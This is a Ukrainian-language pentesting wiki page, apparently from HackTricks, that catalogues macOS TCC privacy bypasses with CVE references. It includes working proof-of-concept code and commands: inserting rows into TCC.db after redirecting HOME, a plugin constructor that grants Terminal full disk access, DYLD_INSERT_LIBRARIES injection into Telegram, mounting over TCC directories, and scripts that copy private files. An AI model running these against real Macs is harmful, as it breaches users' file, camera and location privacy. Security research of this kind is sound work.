# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

## За функціональністю

### Write Bypass

Це не bypass, а просто принцип роботи TCC: **він не захищає від запису**. Якщо Terminal **не має доступу для читання Desktop користувача, він усе одно може записувати до нього**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
Атрибут **`com.apple.macl`** додається до нового **файлу**, щоб надати **creators app** доступ до його читання.

### TCC ClickJacking

Можна **розмістити вікно поверх запиту TCC**, щоб змусити користувача **прийняти** його, не помітивши цього. PoC можна знайти в [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

Зловмисник може **створювати apps з будь-яким ім'ям** (наприклад, Finder, Google Chrome...) у **`Info.plist`** і змусити їх запитувати доступ до певного захищеного TCC розташування. Користувач думатиме, що цей доступ запитує справжній application.\
Крім того, можна **видалити справжній app з Dock і розмістити на ньому fake app**, щоб після натискання користувачем на fake app (який може використовувати ту саму іконку) він міг викликати справжній app, запитати дозволи TCC і виконати malware, змусивши користувача повірити, що доступ запитав справжній app.

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Більше інформації та PoC:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

За замовчуванням доступ через **SSH раніше мав "Full Disk Access"**. Щоб вимкнути його, потрібно, щоб SSH був у списку, але вимкнений (видалення зі списку не прибере ці привілеї):<sup>[2]</sup>

![TCC Request by arbitrary name - SSH Bypass: За замовчуванням доступ через SSH раніше мав "Full Disk Access". Щоб вимкнути його, потрібно, щоб він був у списку, але вимкнений (видалення...](<../../../../../images/image (1077).png>)

Тут можна знайти приклади того, як деякі **malwares змогли обійти цей захист**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/) <sup>[11]</sup>

> [!CAUTION]
> Зверніть увагу, що тепер для можливості увімкнути SSH потрібен **Full Disk Access**

### Handle extensions - CVE-2022-26767

Атрибут **`com.apple.macl`** надається файлам, щоб надати **певному application дозвіл на їх читання.** Цей атрибут встановлюється під час **drag\&drop** файлу на app або коли користувач **двічі клацає** файл, щоб відкрити його за допомогою **default application**.

Тому користувач міг би **зареєструвати malicious app** для обробки всіх розширень і викликати Launch Services для **відкриття** будь-якого файлу (таким чином malicious file отримає дозвіл на читання).

### iCloud

З entitlement **`com.apple.private.icloud-account-access`** можна взаємодіяти з **`com.apple.iCloudHelper`** XPC service, який **надасть iCloud tokens**.

**iMovie** і **Garageband** мали цей entitlement та інші, які це дозволяли.

Для отримання додаткової **інформації** про exploit для **отримання icloud tokens** за допомогою цього entitlement перегляньте доповідь: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)<sup>[12]</sup>

### kTCCServiceAppleEvents / Automation

App із дозволом **`kTCCServiceAppleEvents`** зможе **керувати іншими Apps**. Це означає, що він зможе **зловживати дозволами, наданими іншим Apps**.

Докладніше про Apple Scripts:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

Наприклад, якщо App має **Automation permission для `iTerm`**, як у цьому прикладі, **`Terminal`** має доступ до iTerm:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

Terminal, який не має FDA, може викликати iTerm, що має його, і використовувати його для виконання дій:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Через Finder

Або якщо App має доступ через Finder, це може бути такий скрипт, як цей:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## За поведінкою App

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

The userland **tccd daemon** використовував змінну **`HOME`** **env** для доступу до бази даних користувачів TCC за адресою: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Згідно з [цим дописом на Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686), а також оскільки TCC daemon запускається через **`launchd`** у домені поточного користувача, існує можливість **контролювати всі змінні середовища**, що передаються йому.\
Таким чином, **attacker міг встановити змінну середовища `$HOME`** у **`launchctl`**, щоб вона вказувала на **контрольований** **directory**, перезапустити **TCC** daemon, а потім **безпосередньо змінити базу даних TCC**, надавши собі **кожен доступний TCC entitlement** без жодного запиту до кінцевого користувача.<sup>[1]</sup>\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notes

Notes мав доступ до захищених TCC місць, але коли створюється нотатка, вона **створюється в незахищеному місці**. Тому можна було попросити Notes скопіювати захищений файл у нотатку (тобто в незахищене місце), а потім отримати доступ до файлу:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

Бінарний файл `/usr/libexec/lsd` із бібліотекою `libsecurity_translocate` мав entitlement `com.apple.private.nullfs_allow`, який дозволяв створювати монтування **nullfs**, а також entitlement `com.apple.private.tcc.allow` із **`kTCCServiceSystemPolicyAllFiles`** для доступу до кожного файлу.

Було можливо додати атрибут quarantine до "Library", викликати **`com.apple.security.translocation`** XPC service, після чого Library відображалася як **`$TMPDIR/AppTranslocation/d/d/Library`**, де всі документи всередині Library можна було **отримати**.

### CVE-2024-44131 - FileProvider symlink race

Програми, які передають файлові операції **привілейованому helper** (тут **`fileproviderd`** / **`Files.app`**), копіюють або переміщують об'єкти **від імені користувача**, тому копіювання виконується з привілеями helper, а не caller.

Jamf Threat Labs показала, що перевірку symlink, яка виконується перед операцією, можна **обійти за допомогою race condition**: замість розміщення symlink в **останньому** компоненті шляху (який перевіряється), attacker змінює **проміжну** директорію шляху **після початку копіювання**. Після цього привілейований helper переходить за контрольованим attacker посиланням і читає/записує захищені TCC місця **без жодного відображення prompt**.<sup>[7]</sup>

Директорії, які **не захищені** випадковим UUID у своєму шляху (наприклад `~/Library/Mobile Documents/com~apple~CloudDocs`), є найпростішими цілями, оскільки attacker може передбачити повний шлях для проведення race.

> [!TIP]
> Це загальний шаблон, який слід шукати: **будь-який привілейований процес, що розв'язує шлях більше одного разу** (check-then-use або `rename()`/`copyfile()`, які окремо розв'язують source і destination), можна атакувати через race, замінюючи директорію в середині шляху. Лише `O_NOFOLLOW_ANY`, `openat()` для вже відкритого directory FD або `realpath()` + повторна валідація справді закривають це вікно.

Більше інформації у [**writeup від Jamf Threat Labs**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/).<sup>[7]</sup>

### SQLITE_SQLLOG_DIR

`libsqlite3` можна зібрати з `SQLITE_ENABLE_SQLLOG`, що додає logging hook, керований environment variables ([upstream `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)):<sup>[8]</sup>

- **`SQLITE_SQLLOG_DIR=path`** – для **кожної відкритої database** у `path` записуються **копія database file** та log SQL statements (директорія вже має існувати).
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – створювати **нову копію щоразу**, коли DB відкривається або під'єднується, замість повторного використання тієї самої.
- **`SQLITE_SQLLOG_CONDITIONAL`** – logувати connection лише якщо поруч з основною DB існує файл `<database>-sqllog`.

Якщо можна інжектити цю variable у процес, який має **FDA** та відкриває SQLite databases, він без проблем **скопіює ці захищені databases** у директорію під вашим контролем. Оскільки ім'я destination file формується на основі даних, контрольованих attacker, **symlink, розміщений у destination**, перетворює той самий primitive на **arbitrary file write** із привілеями target process.

### **SQLITE_AUTO_TRACE**

Якщо environment variable **`SQLITE_AUTO_TRACE`** встановлено, library **`libsqlite3.dylib`** почне **logувати** всі SQL queries. Цю library використовували багато applications, тому можна було logувати всі їхні SQLite queries.

Декілька Apple applications використовували цю library для доступу до захищеної TCC інформації.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### Пошук запису файлів під керуванням env-змінних

Два попередні приклади є проявами однієї й тієї самої загальної техніки, тому варто пошукати інші: **frameworks, завантажені в TCC-привілейовані apps, часто надають debug/logging environment variables, які змушують процес створювати файл за шляхом, контрольованим caller'ом**.

Workflow для їх пошуку:

1. Виберіть target із FDA або іншим цікавим TCC permission (`Music`, `TV`, `Terminal`, MDM agents...) і перегляньте frameworks, з якими він пов'язаний (`otool -L`, `vmmap`).
2. Виконайте grep цих frameworks для рядків `getenv`: `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`.
3. Встановіть candidate variables через `launchctl setenv NAME /path/you/control`, запустіть app і спостерігайте за його діями у файловій системі за допомогою `fs_usage -w -f filesys <pid>` або `sudo fs_usage | grep <path>`.
4. Якщо процес **створює або перейменовує** файл у вашій директорії, ви отримали write primitive: вкажіть як destination symlink (або організуйте race для проміжної директорії, як у наведеному вище CVE-2024-44131), щоб перенаправити його до `~/Library/Application Support/com.apple.TCC/TCC.db`.

> [!TIP]
> Цю техніку обмежують дві речі. По-перше, змінні `DYLD_*` ігноруються binary з hardened runtime, **якщо app не містить entitlement** [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) ("a Boolean value that indicates whether the app may be affected by dynamic linker environment variables, which you can use to inject code into your app's process") — див. також [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/). По-друге, Apple видаляє окремі framework debug variables після їхнього виявлення, тому variable, яка працювала в одному релізі macOS, часто вже відсутня в наступному. Якщо app мовчки відмовляється запускатися після її встановлення, вважайте, що ця variable вже відфільтрована.

Див. [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) щодо еквівалентного трюку з linker variables.

### Apple Remote Desktop

Маючи root, можна було б увімкнути цей service, після чого **ARD agent отримав би full disk access**, що згодом можна було б використати для копіювання нової **TCC user database**.

## Через **NFSHomeDirectory**

TCC використовує database у HOME folder користувача для контролю доступу до ресурсів, специфічних для користувача, за адресою **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Отже, якщо користувачеві вдасться перезапустити TCC із env variable $HOME, що вказує на **іншу folder**, користувач зможе створити нову TCC database у **/Library/Application Support/com.apple.TCC/TCC.db** і змусити TCC надати будь-який TCC permission будь-якому app.

> [!TIP]
> Зверніть увагу, що Apple використовує setting, збережений у профілі користувача, в атрибуті **`NFSHomeDirectory`**, як **value `$HOME`**. Тому, якщо ви скомпрометуєте application із permissions для зміни цього value (**`kTCCServiceSystemPolicySysAdminFiles`**), ви можете **weaponize** цю опцію за допомогою TCC bypass.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**Перший POC** використовує [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) і [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) для зміни **HOME** folder користувача.

1. Отримайте _csreq_ blob для target app.
2. Розмістіть fake _TCC.db_ file із необхідним access і _csreq_ blob.
3. Експортуйте запис користувача в Directory Services за допомогою [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Змініть запис у Directory Services, щоб змінити home directory користувача.
5. Імпортуйте змінений запис Directory Services за допомогою [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Зупиніть _tccd_ користувача та перезавантажте process.

У другому POC використовувався **`/usr/libexec/configd`**, який мав `com.apple.private.tcc.allow` зі значенням `kTCCServiceSystemPolicySysAdminFiles`.\
Виявилося можливим запустити **`configd`** з опцією **`-t`**, завдяки чому attacker міг вказати **custom Bundle для завантаження**. Тому exploit **замінює** методи **`dsexport`** і **`dsimport`** для зміни home directory користувача на **code injection у `configd`**.

Докладніше див. [**оригінальний звіт**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).<sup>[13]</sup>

## Через process injection

Існують різні техніки для inject code у process та використання його TCC privileges:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Крім того, найпоширеніший process injection для bypass TCC здійснюється через **plugins (load library)**.\
Plugins — це додатковий code, зазвичай у формі libraries або plist, який **завантажується main application** і виконується в його context. Отже, якщо main application мав access до TCC restricted files (через надані permissions або entitlements), **custom code також матиме цей access**.

### CVE-2020-27937 - Directory Utility

Application `/System/Library/CoreServices/Applications/Directory Utility.app` мав entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, завантажував plugins із розширенням **`.daplug`** і **не мав hardened** runtime.

Щоб weaponize цей CVE, **`NFSHomeDirectory`** **змінюється** (із використанням попереднього entitlement), щоб отримати можливість **перехопити TCC database користувачів** для bypass TCC.

Докладніше див. [**оригінальний звіт**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).<sup>[14]</sup>

### CVE-2020-29621 - Coreaudiod

Binary **`/usr/sbin/coreaudiod`** мав entitlements `com.apple.security.cs.disable-library-validation` і `com.apple.private.tcc.manager`. Перше **дозволяло code injection**, а друге надавало йому access для **керування TCC**.

Цей binary дозволяв завантажувати **third party plug-ins** із folder `/Library/Audio/Plug-Ins/HAL`. Отже, можна було **завантажити plugin і використати TCC permissions** за допомогою цього POC:<sup>[15]</sup>
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Для отримання додаткової інформації перегляньте [**оригінальний звіт**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).<sup>[15]</sup>

### Plug-Ins Device Abstraction Layer (DAL)

Системні застосунки, які відкривають відеопотік камери через Core Media I/O (застосунки з **`kTCCServiceCamera`**), завантажують у процес ці plugins, розташовані в `/Library/CoreMediaIO/Plug-Ins/DAL` (не обмежені SIP).

Достатньо просто зберегти там library зі стандартним **constructor**, щоб виконати **inject code**.

Кілька застосунків Apple були вразливими до цього.

### Firefox

Застосунок Firefox мав entitlements `com.apple.security.cs.disable-library-validation` і `com.apple.security.cs.allow-dyld-environment-variables`:<sup>[16]</sup]
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Більше інформації про те, як легко це exploit’ити, дивіться у [**оригінальному звіті**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).<sup>[16]</sup>

### CVE-2020-10006

Бінарний файл `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` мав entitlements **`com.apple.private.tcc.allow`** і **`com.apple.security.get-task-allow`**, що дозволяло інжектити код у процес і використовувати привілеї TCC.

### CVE-2023-26818 - Telegram

Telegram мав entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** і **`com.apple.security.cs.disable-library-validation`**, тому його можна було зловживати, щоб **отримати доступ до його дозволів**, наприклад для запису за допомогою камери. Ви можете [**знайти payload у writeup**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).<sup>[17]</sup>

Зверніть увагу, що для використання змінної середовища з метою завантаження бібліотеки було створено **custom plist** для інжекції цієї бібліотеки, а для її запуску використано **`launchctl`**:<sup>[17]</sup>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## За допомогою open-викликів

Можна викликати **`open`**, навіть перебуваючи в sandbox

### Terminal Scripts

Досить часто Terminal надають **Full Disk Access (FDA)**, принаймні на комп’ютерах, якими користуються технічні спеціалісти. Також за його допомогою можна викликати скрипти **`.terminal`**.

**`.terminal`** — це plist-файли на кшталт цього, де команда для виконання знаходиться в ключі **`CommandString`**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Застосунок міг би записати terminal script у таке розташування, як /tmp, і запустити його командою на кшталт:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## За допомогою монтування

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Будь-який користувач** (навіть непривілейований) може створити та змонтувати snapshot Time Machine і **отримати доступ до ВСІХ файлів** цього snapshot.\
**Єдиний привілей**, необхідний для цього, полягає в тому, щоб застосунок, який використовується (наприклад, `Terminal`), мав доступ **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), який має надати адміністратор.<sup>[2]</sup>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Більш детальне пояснення можна [**знайти в оригінальному звіті**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

### CVE-2021-1784 & CVE-2021-30808 - Монтування поверх файлу TCC

Навіть якщо файл TCC DB захищений, було можливо **змонтувати поверх директорії** новий файл TCC.db:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Перегляньте **повний exploit** у [**оригінальному описі**](https://theevilbit.github.io/posts/cve-2021-30808/).

### CVE-2024-40855

Як пояснюється в [оригінальному описі](https://www.kandji.io/blog/macos-audit-story-part2), ця CVE використовувала `diskarbitrationd`.<sup>[18]</sup>

Функція `DADiskMountWithArgumentsCommon` із публічного фреймворку `DiskArbitration` виконувала перевірки безпеки. Однак її можна було обійти, безпосередньо викликавши `diskarbitrationd`, а отже, використовуючи елементи `../` у шляху та symlinks.

Це дозволяло зловмиснику виконувати довільне монтування в будь-якому місці, зокрема поверх бази даних TCC, завдяки entitlement `com.apple.private.security.storage-exempt.heritable` процесу `diskarbitrationd`.

### asr

Інструмент **`/usr/sbin/asr`** дозволяв копіювати весь диск і монтувати його в іншому місці, обходячи захист TCC.

### CVE-2022-22655 - Location Services

Location Services **не зберігаються** в базі даних TCC, як інші служби. Ними керує `locationd`, який зберігає власний список дозволених клієнтів у **`/var/db/locationd/clients.plist`**:<sup>[5]</sup>
```bash
# Requires FDA to read
sudo plutil -p /var/db/locationd/clients.plist | head -40
```
Кожен запис ідентифікується клієнтом (bundle ID або шляхом до виконуваного файла) і містить такі поля, як `Authorized`, `BundleId`, `Executable` і `Registered`.

Сам файл `clients.plist` захищений Sandbox/TCC, і його неможливо редагувати навіть із правами root — але **каталог `/var/db/locationd/` не був захищений від монтування**. Тому зловмисник, який працював із правами root, міг створити образ диска із власним `clients.plist` (позначивши свій бінарний файл як `Authorized`), змонтувати його поверх каталогу та перезапустити `locationd`, щоб підроблений список дозволів набув чинності.<sup>[5]</sup>

> [!TIP]
> Це та сама схема, що й у наведених вище TCC bypasses через `hdiutil`/`mount`: *файл* захищений, а *каталог, у якому він міститься*, — ні, тому замінюється весь каталог, а не файл.

## Через startup apps


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## Через grep

У деяких випадках файли зберігають конфіденційну інформацію, як-от електронні адреси, номери телефонів, повідомлення тощо, у незахищених місцях (що в Apple вважається вразливістю).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

Це більше не працює, але [**раніше працювало**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Інший спосіб із використанням [**подій CoreGraphics**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):<sup>[19]</sup>

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## References

- [1] [CVE-2020–9934: Обхід macOS Transparency, Consent, and Control (TCC) Framework](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [2] [Обхід механізмів захисту конфіденційності користувачів macOS через помилки та навмисні дії](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [3] [Понад 20 способів обійти механізми конфіденційності macOS](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [4] [Перемога над TCC — понад 20 НОВИХ способів обійти механізми конфіденційності macOS](https://www.youtube.com/watch?v=a9hsxPdRxsY)
- [5] [CVE-2022-22655 - Обхід TCC Location Services (оригінальний звіт)](https://theevilbit.github.io/posts/cve-2022-22655/)
- [6] [Де у світі Carmen Sandiego: зловживання Location Services у macOS](https://slyd0g.medium.com/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71)
- [7] [Jamf Threat Labs - CVE-2024-44131: TCC bypass викрадає дані з iCloud](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [8] [SQLite - `test_sqllog.c` (змінні середовища SQLITE_ENABLE_SQLLOG)](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [9] [Apple - entitlement для дозволу змінних середовища DYLD](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [10] [The Eclectic Light Company - Notarization: hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)
- [11] [В XCSSET malware виявлено zero-day TCC bypass](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [12] [OBTS v5.0: «Що відбувається на вашому Mac, залишається в iCloud Apple?!» - Wojciech Regula](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [13] [Нова вразливість macOS, «powerdir», може призвести до несанкціонованого доступу до даних користувача](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [14] [Змінити домашній каталог і обійти TCC, або CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [15] [Відтворити музику й обійти TCC, або CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [16] [Як обікрасти (Fire)fox](https://wojciechregula.blog/post/how-to-rob-a-firefox/)
- [17] [CVE-2023-26818 - Обхід TCC за допомогою Telegram у macOS](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
- [18] [Kandji - Виявлення вразливостей Apple: аудит diskarbitrationd і storagekitd, частина 2](https://www.kandji.io/blog/macos-audit-story-part2)
- [19] [Patrick Wardle - Objective by the Sea v2.0: Synthetic Clicks і перехоплення подій CoreGraphics](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)

{{#include ../../../../../banners/hacktricks-training.md}}
